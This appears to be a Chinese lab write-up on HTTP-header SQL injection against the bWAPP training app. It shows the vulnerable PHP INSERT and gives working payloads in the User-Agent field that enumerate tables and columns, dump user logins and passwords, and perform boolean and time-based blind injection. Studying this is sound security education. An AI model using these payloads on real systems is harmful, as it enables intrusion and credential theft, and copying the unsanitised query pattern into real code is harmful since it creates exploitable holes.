针对HTTP请求头,如果不加以过滤或转义,直接与数据库交互的过程容易被利用进行SQL 注入攻击,即HTTP攻击

## 常见场景

访问时,Web Server会从HTTP Header中取出浏览器信息,IP地址,HOST信息等存储到数据库中

## 视频解题

使用burpsuite尝试修改User-Agent 为 123 发现在前端页面也变成 123 

随后继续修改为 123' 有报错

修改 111', '222') # 发现不仅User-Agent被修改, IP_Address 也被改变

此时尝试注入 111', (select database())); # 发现可以返回数据库名

尝试时间盲注 111', sleep(2)); # 可以看出返回时间延迟了大约两秒

## 进入容器查看
 预测形式为 insert into ... values(xxx, yyy)

docker exec -it xxx(容器ID) bash
```php
$ip_address = $_SERVER["REMOTE_ADDR"];
$user_agent = $_SERVER["HTTP_USER_AGENT"];

$sql = "INSERT INTO visitors (date, user_agent, ip_address) VALUES (now(), '" . sqli($user_agent) . "', '" . $ip_address . "')";
```
## 课后题

1 利用SQL盲注完成HTTP头注入

2 (提高)尝试用两种以上不同MySQL函数完成盲注练习

3 (进阶)修改user-agent 与 ip_address位置尝试注入

## 写作业 

#### 1 SQL注入

我们在课程中已经知道数据库名称为 bWAPP  注意每次只能返回一行,所以要 limit 1

1 information_schema.tables 为 数据库中表数据表信息
```
111', (select table_name from information_schema.tables where table_schema=database() limit 1 offset 0)); #
```
可以成功查询数据表,但是返回为blog,并不是我们所希望的内容.接下来通过修改 offset 偏移控制返回第几条;可以发现offset为3时返回数据表名为 users

2 查询user中包含几个字段

  information_schema.columns 很重要! 具体利用过程同上
```
111', (select column_name from information_schema.columns where table_name='users' limit 1 offset 0)); #
```
  利用上述指令即可查得id,继续利用偏移查询 id login password 分别位于偏移 0, 1, 2 处

3 查询具体敏感数据
```
111', (select id from users limit 1 offset 0)); #
```
  直接对users数据表的第一个id字段进行查询
  
  同理将id 更换为 login 与 password 即可查询得到id为1的用户全部信息,再更换offset重复上述操作即可完成SQL注入攻击

#### 2 两种以上不同函数完成

因为可以直执行整句逻辑,很自由,下面两种方法都可以帮助我们进行SQL注入

1 布尔注入

substring(version(), 1, 1) = 5    =5时返回1 !=5时返回 0 意味着我们还可以使用布尔进行SQL注入,需要编写简本
```
111', substring(database(),1,1)='b'); # 
```
返回1 一次类推遍历 (33,128) 可以依次找寻到数据库名字全称.在上一节时间盲注的练习中没少写... 同理


2 时间延迟注入

sleep(3) 与布尔型同理,但是可以应对没有回显情况.通过判断延时是否被执行从而推断出SQL条件是否正确.因为时间延迟注入中要前置条件为真,所以可以看作布尔注入升级版
```
111', substring(database(),1,1)='b' and sleep(2)); #
```
在布尔注入后直接加上and sleep(2)即可


#### 3 交换位置怎么办

首先修改代码
```php
$sql = "INSERT INTO visitors (date, ip_address, user_agent) VALUES (now(), '" . sqli($ip_address) . "', '" . $user_agent . "')";
```

测试111正常,后续指令失效,原因是交换位置后已经无法再继续向后直接拼接

课程的评论区大佬已经给出时间盲注的解决办法
```
111'+ (substring(database(),1,1)='b' and sleep(2)));#
```
写burpsuite脚本还不会QAQ练习会了再回来补
